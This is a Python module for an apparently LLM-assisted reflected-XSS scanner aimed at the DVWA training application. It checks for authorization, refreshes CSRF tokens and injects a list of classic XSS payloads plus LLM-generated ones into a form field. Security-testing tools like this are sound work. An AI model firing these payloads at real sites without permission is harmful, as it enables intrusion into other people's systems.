# scanners/xss_scanner.py
import requests
from bs4 import BeautifulSoup
from llm.payload_generator import LLMPayloadGenerator
from core.authorization import AuthorizationChecker

class XSSScanner:
    """LLM-powered XSS vulnerability scanner"""

    def __init__(self, target_url, session=None):
        self.target_url = target_url
        self.session = session or requests.Session()
        self.payload_gen = LLMPayloadGenerator()
        self.auth = AuthorizationChecker()
        self.findings = []

        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Security Scanner - Authorized Testing)"
        })

    def get_fresh_token(self, url):
        """Fetch a fresh CSRF token from the page before each request"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")
            token_input = soup.find("input", {"name": "user_token"})
            if token_input:
                return token_input["value"]
        except Exception as e:
            print(f"[XSS] Error fetching token: {e}")
        return None

    def get_forms(self, url):
        """Extract all forms from a page"""
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")
            return soup.find_all("form")
        except Exception as e:
            print(f"[XSS] Error fetching page: {e}")
            return []

    def get_form_details(self, form):
        """Extract details from a form element"""
        details = {
            "action": form.attrs.get("action", "").lower(),
            "method": form.attrs.get("method", "get").lower(),
            "inputs": []
        }
        for input_tag in form.find_all(["input", "textarea"]):
            details["inputs"].append({
                "type": input_tag.attrs.get("type", "text"),
                "name": input_tag.attrs.get("name", ""),
                "value": input_tag.attrs.get("value", "")
            })
        return details

    def submit_with_payload(self, url, payload):
        """
        Fetch fresh page, grab fresh token, inject payload and submit.
        This ensures a valid CSRF token is used every single time.
        """
        try:
            # Always get a fresh page and fresh token
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, "html.parser")

            # Get fresh token
            token_input = soup.find("input", {"name": "user_token"})
            token = token_input["value"] if token_input else ""

            # Build params with payload + fresh token
            params = {
                "name": payload,
                "user_token": token
            }

            # Submit via GET (DVWA XSS reflected uses GET)
            result = self.session.get(url, params=params, timeout=10)
            return result

        except Exception as e:
            print(f"[XSS] Error during submission: {e}")
            return None

    def check_xss_in_response(self, response, payload):
        """Check if payload is reflected in the response"""
        if response and payload in response.text:
            return True
        return False

    def scan(self):
        """Main scan method"""

        if not self.auth.check_authorization(self.target_url):
            print("[XSS] ❌ Scan aborted - Target not authorized!")
            return []

        print(f"\n[XSS] 🔍 Starting XSS scan on: {self.target_url}")

        # Generate LLM payloads
        print("[XSS] Generating XSS payloads using LLM...")
        llm_payloads = self.payload_gen.generate_xss_payloads(
            field_type="text input",
            detected_filters="none",
            html_context="web form",
            target_context="DVWA low security"
        )

        # Static reliable payloads
        static_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert(1)>",
        ]

        all_payloads = static_payloads.copy()
        for p in llm_payloads:
            if isinstance(p, dict):
                all_payloads.append(p.get("payload", ""))

        print(f"[XSS] Testing {len(all_payloads)} payloads against target...")

        for payload in all_payloads:
            if not payload:
                continue

            # Fresh token fetch + submit for every single payload
            response = self.submit_with_payload(self.target_url, payload)

            if self.check_xss_in_response(response, payload):
                finding = {
                    "type": "XSS - Reflected",
                    "url": self.target_url,
                    "payload": payload,
                    "severity": "High",
                    "evidence": "Payload reflected in response"
                }
                self.findings.append(finding)
                print(f"[XSS] ✅ VULNERABLE! Payload worked: {payload[:60]}")
                break  # Found one - enough to confirm vulnerability

        if not self.findings:
            print("[XSS] No XSS vulnerability detected with tested payloads.")

        print(f"\n[XSS] Scan complete. Found {len(self.findings)} vulnerability/vulnerabilities.")
        return self.findings
